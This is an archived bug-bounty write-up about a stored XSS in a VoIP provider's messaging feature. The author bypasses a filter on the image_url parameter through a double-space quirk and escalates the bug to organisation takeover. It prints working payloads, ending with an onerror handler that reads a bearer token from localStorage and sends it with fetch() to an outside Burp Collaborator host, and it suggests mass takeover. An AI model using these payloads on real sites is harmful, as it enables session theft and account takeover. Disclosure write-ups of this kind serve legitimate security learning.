# :globe_with_meridians: Stored XSS to Organisation Takeover

> **Original Source:** [Stored XSS to Organisation Takeover](https://infosecwriteups.com/stored-xss-to-organisation-takeover-6eaaa2fdcd5b)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# Stored XSS to Organisation Takeover


TL;DR: This is a writeup about how I did an Organisation takeover on one of the leading VoIP companies by bypassing their XSS filter and stealing session Token from local storage.

## Introduction


>

I have always loved to go deep into things. XSS is not just about finding the alert box’s it’s a lot more than that. Bypassing filter is an essential part of finding awesome XSS bugs. We should always try to escalate the XSS bug to the Account takeover.


This was a private program. I was playing with all the different features & text functionality caught my attention. Through this feature, we can send a text to organization users with attachments. I started sending a text with an image attached and captured all the traffic in the burp suite. On clicking send button application first made a POST request for uploading the image on cloud storage and then the PATCH request with parameters text, image_url, and other important parameters,


I directly went after image_url. I tried to change the image_url from the original uploaded image URL to a random one & the server did accept it.


*vulnerable parameter “image_url” in a PATCH request*


And the URL was reflected with <img> tag & "`s1600"` string concatenated


*HTML reflection in <img> tag of image_url*


I become immediately excited & started testing the endpoint


- First, I put a different image URL in the Image_url param. The server did accept it

- I put a non URL value in the image_url parameter, and it was accepted as well.

- Now I straight away tried `javascript:alert()` But javascript changed it to`javascript:void(0)` on the front-end.

- I tried to break out from quotes, but that was encoded safely.

- I tried to break the filter with the BlackBox approach but was not successful.


One thing that really made me curious was why the string `s1600`are gettings concatenated to image_url value on the front-end? So I look for the javascript responsible for that. While analyzing the javascript, adding double space after a single or more character in the image_url parameter creates the below-mentioned HTML content on the frontend.

*HTML Reflection*


After that, I tried multiple payloads in the image_url parameter.


Payload 1


`*image_url="xxx test"*`


And the reflection in HTML was like


`<img src="xxx "="tests1600">`


Payload 2


`*image_url=*"xxx onerror=test"`


And the reflection in HTML was like


`<img src="xxx "onerror="tests1600">`


Payload 3


`*image_url=*"xxx onerror=alert(document.cookie);"`


## Get Zaid Bin Ashraf’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


And the reflection in HTML was like


`<img src="xxx "onerror="alert(document.cookie);s1600">`


I got a beautiful alert box on page :D

*XSS Alert box*


To avoid duplicates, I immediately send the report to the concerned program without creating an actual POC for an account takeover. And the reply from the ASE team was


Now I have to find a way to take over the account. First, I thought of exploit any email change functionality by bypassing CSRF protection through XSS. Still, I saw the impact was limited because the admin accounts can only change email id. After going through different requests, I saw the application also uses the Bearer token on top of cookies-based authentication. And the application was storing the bearer token in local storage in JSON format.

## Local storage


Local storage is a Web Storage API that is used by browsers to store key/value pair. It maintains a separate storage area for each domain(origin). Data remains in local storage even if the browser is closed. Local storage can be accessed via the Window.localStorage object. We can also check local storage in dev tools.


We can read local storage through javascript. To retrieve the key, use. `getItem()`.


`localStorage.getItem('Key')`


We can future parse the JSON value of the key with `JSON.parse`


`json.parse(localStorage.getItem('Key')).KEYNAME`


Stealing Access token from Local Storage


Now you have understood how we can access data from local storage. It will be easy to understand the final payload. As already mentioned, the application was storing the bearer token in local storage. Let me break down my final payload.


- I first retrieved the access_token from the local storage
`token=JSON.parse(localStorage.getItem('KEYNAME')).access_token`

- Concatenated token to my Burp collaborator URL
`url=https://g0h5el9lym4iht5u2co4ovymud03os.burpcollaborator.net/'token`

- Send fetch request to URL to receive the token
`fetch(url)`


Final Payload for parameter image_url:


`"xxx onerror=token=JSON.parse(localStorage.getItem('KEYNAME')).access_token,url=https://g0h5el9lym4iht5u2co4ovymud03os.burpcollaborator.net/'+token,fetch(url);"`


And it was reflected in HTML as


`<img src="xxx" onerror="token=JSON.parse(localStorage.getItem('KEYNAME')).access_token,url='https://g0h5el9lym4iht5u2co4ovymud03os.burpcollaborator.net/'+token,fetch(url);s1600">`


*Burp Request received.*

## Taking the attack to the next level


This VoIP provider is providing contact numbers in series. We can do a mass account takeover by sending the message payload to a whole number series & gained the access tokens at the mass level.


You can follow me on [Twitter](https://twitter.com/zaidozaid).

---

*Originally published on [Medium](https://infosecwriteups.com/stored-xss-to-organisation-takeover-6eaaa2fdcd5b). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
